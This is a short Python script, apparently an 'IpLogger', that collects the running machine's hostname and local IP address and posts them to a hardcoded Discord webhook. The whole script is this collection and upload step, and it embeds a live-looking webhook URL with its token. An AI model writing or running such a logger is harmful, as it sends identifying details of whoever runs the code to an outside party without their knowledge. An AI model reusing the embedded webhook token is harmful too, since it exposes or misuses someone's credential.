import socket
from discord_webhook import DiscordWebhook, DiscordEmbed

host_name = socket.gethostname()
ip_adress = socket.gethostbyname(host_name)
print("Host name: ", host_name)
print("IP adress: ", ip_adress)

content = "Placeholder Message"
webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1256356494300024887/OCVv5VlqgozqYoc2mcn_DjEUUdT2LC3kTM53Qm3ykNXalMp1cm00taLhT_X9k009RBIw" , usernsme="IpLogger", content=content)
embed = DiscordEmbed(title="IP: " + ip_adress + " | Host: " + host_name, color = 123123)
webhook.add_embed(embed)
response = webhook.execute()